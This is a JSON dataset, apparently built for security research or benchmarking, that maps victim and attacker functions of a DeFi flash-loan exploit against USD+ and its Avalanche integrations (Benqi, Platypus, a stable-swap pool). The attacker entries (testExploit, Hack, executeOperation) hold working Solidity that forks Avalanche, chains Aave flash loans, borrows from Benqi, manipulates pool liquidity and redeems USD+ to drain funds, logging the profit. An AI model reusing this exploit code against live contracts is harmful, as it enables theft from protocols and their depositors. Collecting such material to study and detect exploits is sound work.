[
  {
    "contract/interface": "JoeRouter",
    "source_type": "victim_contract",
    "function_name": "swapAVAXForExactTokens",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SicleRouter",
    "source_type": "victim_contract",
    "function_name": "swapExactTokensForTokens",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "Hack",
    "original_code": "    function Hack() public {\n        for (uint256 i = 0; i < 6; i++) {\n            cheats.roll(block.number + 1);\n            PoolV2BorrowAmount = USDC_e.balanceOf(avUSDC);\n            address[] memory assets = new address[](1);\n            assets[0] = address(USDC_e);\n            uint256[] memory amounts = new uint256[](1);\n            amounts[0] = PoolV2BorrowAmount;\n            uint256[] memory modes = new uint256[](1);\n            modes[0] = 0;\n            LendingPoolV2.flashLoan(address(this), assets, amounts, modes, address(this), \"\", 0); // FlashLoan USDC.e\n            cheats.roll(block.number + 1); // USD+ buy and redeem not allowed in one block\n            // redeem USD+ to USDC\n            if ((totalNetAsset.totalNetAssets() - netAsset.netAssetValue()) > USDPLUS.balanceOf(address(this))) {\n                USDplus.redeem(address(USDC), USDPLUS.balanceOf(address(this)));\n            } else {\n                USDplus.redeem(address(USDC), totalNetAsset.totalNetAssets() - netAsset.netAssetValue());\n            }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external payable returns (bool) {\n        if (msg.sender == address(LendingPoolV2)) {\n            USDC_e.approve(address(LendingPoolV2), type(uint256).max);\n            address[] memory assets1 = new address[](1);\n            assets1[0] = address(USDC);\n            uint256[] memory amounts1 = new uint256[](1);\n            amounts1[0] = PoolV2BorrowAmount / 2;\n            uint256[] memory modes = new uint256[](1);\n            modes[0] = 0;\n            PoolV3.flashLoan(address(this), assets1, amounts1, modes, address(this), \"\", 0); // FlashLoan USDC\n\n            return true;\n        } else {\n            USDC.approve(address(PoolV3), type(uint256).max);\n            uint256 mintAmount = PoolV2BorrowAmount / 2;\n            USDC.approve(address(qiUSDCn), type(uint256).max);\n            qiUSDCn.mint(mintAmount); // deposit USDC to qiUSDCn\n\n            address[] memory qiTokens = new address[](1);\n            qiTokens[0] = address(qiUSDCn);\n            Benqi.enterMarkets(qiTokens);\n            (, uint256 accountLiquidity,) = Benqi.getAccountLiquidity(address(this));\n            uint256 oraclePrice = Oracle.getUnderlyingPrice(address(qiUSDC)) / 1e18;\n            uint256 borrowAmount = accountLiquidity / oraclePrice;\n            qiUSDC.borrow(borrowAmount); // borrow USDC.e from qiUSDC\n\n            // swap USDC.e to nUSD, DAI.e, USDT.e\n            USDC_e.approve(address(Swap), type(uint256).max);\n            nUSDLP.approve(address(Swap), type(uint256).max);\n            uint256[] memory amount = new uint256[](4);\n            amount[2] = USDC_e.balanceOf(address(this));\n            uint256 minToMint = Swap.calculateTokenAmount(amount, true) * 99 / 100;\n            uint256 LPAmount = Swap.addLiquidity(amount, minToMint, block.timestamp);\n            uint256 i = 0;\n            while (i < 9) {\n                uint256[] memory removeAmount = new uint256[](4);\n                removeAmount = Swap.calculateRemoveLiquidity(LPAmount);\n                removeAmount[2] = 0;\n                Swap.removeLiquidityImbalance(removeAmount, LPAmount, block.timestamp);\n                LPAmount = nUSDLP.balanceOf(address(this));\n                i++;\n            }\n            uint256[] memory removeAmount1 = new uint256[](4);\n            removeAmount1 = Swap.calculateRemoveLiquidity(LPAmount);\n            Swap.removeLiquidityImbalance(removeAmount1, LPAmount, block.timestamp);\n            uint256 swapAmount = USDC_e.balanceOf(address(this)) / 3;\n            nUSD.approve(address(Swap), type(uint256).max);\n            DAI_e.approve(address(Swap), type(uint256).max);\n            USDT_e.approve(address(Swap), type(uint256).max);\n            // swap remaining USDC.e to nUSD, DAI.e, USDT.e\n            Swap.swap(2, 0, swapAmount, 0, block.timestamp);\n            Swap.swap(2, 1, swapAmount, 0, block.timestamp);\n            Swap.swap(2, 3, swapAmount, 0, block.timestamp);\n\n            USDC.approve(address(USDplus), type(uint256).max);\n            USDplus.buy(address(USDC), USDC.balanceOf(address(this))); // tigger Swap.addLiquidity(USDC.e), add USDC.e reserve in Pool\n            // swap nUSD, DAI.e, USDT.e to USDC.e\n            Swap.swap(0, 2, nUSD.balanceOf(address(this)), 0, block.timestamp);\n            Swap.swap(1, 2, DAI_e.balanceOf(address(this)), 0, block.timestamp);\n            Swap.swap(3, 2, USDT_e.balanceOf(address(this)), 0, block.timestamp);\n\n            USDC_e.approve(address(qiUSDC), qiUSDC.borrowBalanceStored(address(this)));\n            qiUSDC.repayBorrow(qiUSDC.borrowBalanceStored(address(this))); // repay borrow USDC.e\n            qiUSDCn.redeemUnderlying(mintAmount); // withdraw USDC from qiUSDCn\n\n            USDC_e.approve(address(Platypus), type(uint256).max);\n            uint256 USDC_eSwapAmount = USDC_e.balanceOf(address(this)) - PoolV2BorrowAmount / 9991 * 10_000 + 1000;\n            Platypus.swap(\n                address(USDC_e),\n                address(USDC),\n                USDC_eSwapAmount,\n                USDC_eSwapAmount * 99 / 100,\n                address(this),\n                block.timestamp\n            ); // swap profit USDC.e to USDC\n\n            return true;\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"Avalanche\", 23_097_846);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public payable {\n        amountBuy = 36_000_000_000;\n        address[] memory path = new address[](2);\n        path[0] = address(WAVAX);\n        path[1] = address(USDC);\n        Router.swapAVAXForExactTokens{value: 2830 ether}(amountBuy, path, address(this), block.timestamp);\n\n        uint256 beforeAttackBalance = USDC.balanceOf(address(this));\n        emit log_named_uint(\"Before exploit , USDC balance of attacker\", beforeAttackBalance / 1e6);\n\n        Hack();\n\n        uint256 afterAttackBalance = USDC.balanceOf(address(this));\n        emit log_named_uint(\"After exploit , USDC balance of attacker\", afterAttackBalance / 1e6);\n\n        uint256 profitAttack = afterAttackBalance - beforeAttackBalance;\n        emit log_named_uint(\"Profit: USDC balance of attacker\", profitAttack / 1e6);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "NetAsset",
    "source_type": "victim_contract",
    "function_name": "netAssetValue",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "QiUSDCn",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "  function mint(address to, uint256 amount) external {\n    require(hasRole(MINTER_ROLE, msg.sender), 'Not a minter');\n    _mint(to, amount);\n  }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "QiUSDCn",
    "source_type": "victim_contract",
    "function_name": "redeemUnderlying",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "BenqiChainlinkOracle",
    "source_type": "victim_contract",
    "function_name": "getUnderlyingPrice",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "BenqiFinance",
    "source_type": "victim_contract",
    "function_name": "enterMarkets",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "BenqiFinance",
    "source_type": "victim_contract",
    "function_name": "getAccountLiquidity",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "BenqiFinance",
    "source_type": "victim_contract",
    "function_name": "getHypotheticalAccountLiquidity",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "QiUSDC",
    "source_type": "victim_contract",
    "function_name": "borrow",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "QiUSDC",
    "source_type": "victim_contract",
    "function_name": "borrowBalanceStored",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "QiUSDC",
    "source_type": "victim_contract",
    "function_name": "repayBorrow",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "PlatypusFinance",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SwapFlashLoan",
    "source_type": "victim_contract",
    "function_name": "addLiquidity",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SwapFlashLoan",
    "source_type": "victim_contract",
    "function_name": "calculateRemoveLiquidity",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SwapFlashLoan",
    "source_type": "victim_contract",
    "function_name": "calculateTokenAmount",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SwapFlashLoan",
    "source_type": "victim_contract",
    "function_name": "removeLiquidityImbalance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TotalNetAsset",
    "source_type": "victim_contract",
    "function_name": "totalNetAssets",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "USDPlus",
    "source_type": "victim_contract",
    "function_name": "buy",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "USDPlus",
    "source_type": "victim_contract",
    "function_name": "redeem",
    "original_code": "",
    "description": ""
  }
]